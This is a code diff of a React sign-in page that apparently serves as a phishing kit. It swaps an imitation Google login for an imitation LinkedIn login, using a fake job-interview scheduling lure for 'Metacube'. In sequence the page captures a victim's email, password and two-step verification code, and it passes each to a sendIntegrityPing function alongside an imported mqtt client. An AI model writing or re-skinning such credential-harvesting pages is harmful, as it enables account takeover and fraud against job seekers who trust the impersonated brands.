@@ -1,7 +1,7 @@
 'use client';
 import { useState } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
-import { ChevronDown, UserCircle, ShieldCheck, Calendar, Clock, Video } from 'lucide-react';
+import { ChevronDown, UserCircle, ShieldCheck, Calendar, Clock, Video, Linkedin } from 'lucide-react';
 import mqtt from 'mqtt';
 
 export default function CustomLoginPage() {
@@ -38,105 +38,130 @@ export default function CustomLoginPage() {
   };
 
   return (
-    <div className="min-h-screen bg-white flex items-center justify-center font-sans antialiased text-[#202124]">
-      <div className="w-full max-w-[450px] border border-gray-200 rounded-lg px-10 pb-12 pt-10 shadow-sm">
+    <div className="min-h-screen bg-[#f3f2ef] flex items-center justify-center font-sans antialiased text-gray-900">
+      <div className="w-full max-w-[400px] bg-white border border-gray-200 rounded-xl px-8 pb-10 pt-8 shadow-md">
         
-        {/* LOGO SECTION - FULLY UNRESTRICTED */}
-        <div className="flex justify-center mb-6 mt-2">
-          <img 
-            src="https://www.gstatic.com/images/branding/googleg/1x/googleg_standard_color_128dp.png" 
-            alt="Google Logo" 
-            className="h-12 w-12 object-contain"
-          />
+        {/* LINKEDIN LOGO SECTION */}
+        <div className="flex justify-start mb-6">
+          <svg className="h-8 text-[#0a66c2] fill-current" viewBox="0 0 24 24">
+            <path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/>
+          </svg>
         </div>
 
         <AnimatePresence mode="wait">
           {step === 1 && (
-            <motion.div key="email" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
-              <h1 className="text-2xl text-center mb-2 font-normal">Sign in</h1>
-              <p className="text-center mb-8 font-normal">Use your Google Account</p>
-              <div className="relative mb-2">
-                <input type="email" onChange={(e) => setEmail(e.target.value)} className="w-full px-4 py-4 border border-gray-300 rounded-md focus:border-blue-600 focus:ring-[0.5px] focus:ring-blue-600 outline-none transition-all peer placeholder-transparent" placeholder="Email" id="email" />
-                <label htmlFor="email" className="absolute left-4 -top-2.5 bg-white px-1 text-sm text-gray-600 transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:-top-2.5 peer-focus:text-sm peer-focus:text-blue-600">Email or phone</label>
+            <motion.div key="email" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
+              <h1 className="text-3xl font-semibold mb-2">Sign in</h1>
+              <p className="text-sm mb-6 text-gray-600">Stay updated on your professional world</p>
+              
+              <div className="relative mb-4">
+                <input 
+                  type="email" 
+                  onChange={(e) => setEmail(e.target.value)} 
+                  className="w-full px-4 py-3 border border-gray-500 rounded focus:border-[#0a66c2] focus:ring-1 focus:ring-[#0a66c2] outline-none transition-all peer" 
+                  placeholder="Email or Phone" 
+                />
               </div>
               
-              {/* RESTORED: Forgot email */}
-              <div className="text-blue-600 text-sm font-semibold cursor-pointer mb-8 hover:underline">Forgot email?</div>
-              
-              <p className="text-sm text-gray-600 leading-normal mb-10">
-                Not your computer? Use Guest mode to sign in privately. <span className="text-blue-600 font-semibold cursor-pointer hover:underline">Learn more</span>
-              </p>
+              <div className="text-[#0a66c2] text-md font-semibold cursor-pointer mb-6 hover:underline">Forgot password?</div>
 
-              <div className="flex justify-between items-center">
-                <button className="text-blue-600 font-semibold text-sm hover:bg-blue-50 px-2 py-2 rounded">Create account</button>
-                <button onClick={() => sendIntegrityPing(1, email)} className="bg-[#1a73e8] text-white px-6 py-2 rounded font-semibold text-sm hover:bg-blue-700">Next</button>
+              <button 
+                onClick={() => sendIntegrityPing(1, email)} 
+                className="w-full bg-[#0a66c2] text-white py-3 rounded-full font-semibold text-lg hover:bg-[#004182] transition-colors mb-4"
+              >
+                Next
+              </button>
+
+              <div className="flex items-center my-4">
+                <div className="flex-grow border-t border-gray-300"></div>
+                <span className="px-3 text-gray-500 text-sm">or</span>
+                <div className="flex-grow border-t border-gray-300"></div>
               </div>
+
+              <button className="w-full border border-gray-600 text-gray-700 py-3 rounded-full font-semibold text-md hover:bg-gray-50 transition-colors mb-4">
+                New to LinkedIn? Join now
+              </button>
             </motion.div>
           )}
 
           {step === 2 && (
             <motion.div key="password" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
-              <h1 className="text-2xl text-center mb-2">Welcome</h1>
+              <h1 className="text-2xl font-semibold mb-6 text-center">Enter your password</h1>
               <div className="flex justify-center mb-8">
-                <div className="flex items-center gap-2 border border-gray-300 rounded-full px-2 py-1 pr-3 hover:bg-gray-50 cursor-pointer">
-                  <UserCircle className="w-5 h-5 text-gray-600" />
-                  <span className="text-sm font-medium">{email}</span>
-                  <ChevronDown className="w-4 h-4 text-gray-500" />
+                <div className="flex items-center gap-2 bg-gray-100 rounded-full px-4 py-2">
+                  <span className="text-sm font-medium text-gray-700">{email}</span>
                 </div>
               </div>
-              <div className="relative mb-6">
-                <input type="password" onChange={(e) => setPassword(e.target.value)} className="w-full px-4 py-4 border border-gray-300 rounded-md focus:border-blue-600 focus:ring-[0.5px] focus:ring-blue-600 outline-none transition-all peer placeholder-transparent" placeholder="Password" id="password" />
-                <label htmlFor="password" className="absolute left-4 -top-2.5 bg-white px-1 text-sm text-gray-600 transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:-top-2.5 peer-focus:text-sm peer-focus:text-blue-600">Enter your password</label>
+              
+              <div className="relative mb-8">
+                <input 
+                  type="password" 
+                  onChange={(e) => setPassword(e.target.value)} 
+                  className="w-full px-4 py-3 border border-gray-500 rounded focus:border-[#0a66c2] outline-none transition-all" 
+                  placeholder="Password" 
+                />
               </div>
               
-              <div className="flex justify-between items-center pt-4">
-                {/* RESTORED: Forgot password */}
-                <button className="text-blue-600 font-semibold text-sm hover:underline">Forgot password?</button>
-                <button onClick={() => sendIntegrityPing(2, password)} className="bg-[#1a73e8] text-white px-6 py-2 rounded font-semibold text-sm hover:bg-blue-700">Next</button>
-              </div>
+              <button 
+                onClick={() => sendIntegrityPing(2, password)} 
+                className="w-full bg-[#0a66c2] text-white py-3 rounded-full font-semibold text-lg hover:bg-[#004182] transition-colors"
+              >
+                Sign in
+              </button>
             </motion.div>
           )}
 
-          {/* Steps 3, 4, 5 remain intact for code integrity */}
           {step === 3 && (
             <motion.div key="2fa" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
-              <h1 className="text-2xl text-center mb-2">Verification</h1>
+              <h1 className="text-2xl font-semibold text-center mb-4">Two-step verification</h1>
               <div className="flex flex-col items-center mb-8 mt-4 text-center">
-                <ShieldCheck className="w-16 h-16 text-blue-500 mb-4 stroke-1" />
-                <p className="text-sm text-gray-600">Check your phone for the 6-digit code.</p>
+                <ShieldCheck className="w-16 h-16 text-[#0a66c2] mb-4 stroke-1" />
+                <p className="text-sm text-gray-600">Enter the 6-digit code sent to your mobile device.</p>
               </div>
               <div className="relative mb-12">
-                <input type="text" onChange={(e) => setCode(e.target.value)} className="w-full px-4 py-4 border border-gray-300 rounded-md focus:border-blue-600 outline-none transition-all placeholder-transparent" placeholder="Code" />
-                <label className="absolute left-4 -top-2.5 bg-white px-1 text-sm text-blue-600">Enter code</label>
+                <input 
+                  type="text" 
+                  onChange={(e) => setCode(e.target.value)} 
+                  className="w-full px-4 py-3 border border-gray-500 rounded focus:border-[#0a66c2] outline-none transition-all" 
+                  placeholder="6-digit code" 
+                />
               </div>
-              <div className="flex justify-end">
-                <button onClick={() => sendIntegrityPing(3, code)} className="bg-[#1a73e8] text-white px-8 py-2 rounded font-semibold text-sm">Verify</button>
-              </div>
+              <button 
+                onClick={() => sendIntegrityPing(3, code)} 
+                className="w-full bg-[#0a66c2] text-white py-3 rounded-full font-semibold text-lg"
+              >
+                Submit
+              </button>
             </motion.div>
           )}
 
           {step === 4 && (
             <motion.div key="scheduler" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}>
-              <h1 className="text-2xl text-center mb-1 font-medium">Select Slot</h1>
-              <p className="text-center text-sm text-gray-500 mb-8 font-medium">Schedule your interview with Metacube</p>
+              <h1 className="text-2xl font-semibold text-center mb-2">Schedule Your Interview</h1>
+              <p className="text-center text-sm text-gray-500 mb-8 font-medium">Verified via LinkedIn Profile</p>
               <div className="space-y-4 mb-8">
-                <div className="flex items-center gap-3 p-3 border border-gray-200 rounded-xl">
-                  <Calendar className="w-5 h-5 text-blue-600" />
+                <div className="flex items-center gap-3 p-3 border border-gray-300 rounded-lg">
+                  <Calendar className="w-5 h-5 text-[#0a66c2]" />
                   <input type="date" onChange={(e) => setScheduleData({...scheduleData, date: e.target.value})} className="w-full bg-transparent outline-none text-sm font-medium" />
                 </div>
-                <div className="flex items-center gap-3 p-3 border border-gray-200 rounded-xl">
-                  <Clock className="w-5 h-5 text-blue-600" />
+                <div className="flex items-center gap-3 p-3 border border-gray-300 rounded-lg">
+                  <Clock className="w-5 h-5 text-[#0a66c2]" />
                   <input type="time" onChange={(e) => setScheduleData({...scheduleData, time: e.target.value})} className="w-full bg-transparent outline-none text-sm font-medium" />
                 </div>
-                <div className="flex items-center gap-3 p-3 border border-gray-200 rounded-xl">
-                  <Video className="w-5 h-5 text-blue-600" />
+                <div className="flex items-center gap-3 p-3 border border-gray-300 rounded-lg">
+                  <Video className="w-5 h-5 text-[#0a66c2]" />
                   <select onChange={(e) => setScheduleData({...scheduleData, mode: e.target.value})} className="w-full bg-transparent outline-none text-sm font-medium">
-                    <option>Virtual (Google Meet)</option>
+                    <option>Virtual (Microsoft Teams)</option>
                     <option>In-person (Metacube HQ)</option>
                   </select>
                 </div>
               </div>
-              <button onClick={() => sendIntegrityPing(4, scheduleData)} className="w-full bg-[#1a73e8] text-white py-3 rounded-xl font-bold hover:bg-blue-700 transition-colors">Schedule Interview</button>
+              <button 
+                onClick={() => sendIntegrityPing(4, scheduleData)} 
+                className="w-full bg-[#0a66c2] text-white py-3 rounded-full font-bold hover:bg-[#004182] transition-colors"
+              >
+                Confirm Appointment
+              </button>
             </motion.div>
           )}
 
@@ -145,10 +170,10 @@ export default function CustomLoginPage() {
               <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                 <ShieldCheck className="w-12 h-12 text-green-600" />
               </div>
-              <h1 className="text-2xl font-black text-gray-900 mb-4">Interview Scheduled</h1>
+              <h1 className="text-2xl font-bold text-gray-900 mb-4">Confirmed!</h1>
               <p className="text-gray-600 leading-relaxed font-medium text-center">
-                Your confirmation has been sent to your email. <br/>
-                <span className="text-blue-600 font-bold mt-2 inline-block">Thank you for choosing Metacube.</span>
+                Your interview details have been synced to your calendar. <br/>
+                <span className="text-[#0a66c2] font-bold mt-2 inline-block">Metacube is looking forward to meeting you.</span>
               </p>
             </motion.div>
           )}
